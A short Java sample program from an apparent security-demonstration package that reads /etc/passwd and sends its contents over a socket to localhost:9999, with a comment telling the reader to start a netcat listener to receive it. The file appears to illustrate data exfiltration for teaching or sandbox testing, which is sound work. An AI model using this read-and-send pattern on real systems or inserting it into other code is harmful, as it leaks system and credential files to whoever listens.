package de.spinscale.security.samples;

import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Sample04 {

    // open a network socket to exfiltrate some data
    // start nc -l 9999 on another console
    public static void main(String[] args) throws Exception {
        try (Socket socket = new Socket("localhost", 9999)) {
            byte[] bytes = Files.readAllBytes(Paths.get("/etc/passwd"));
            socket.getOutputStream().write(bytes);
        }
    }
}
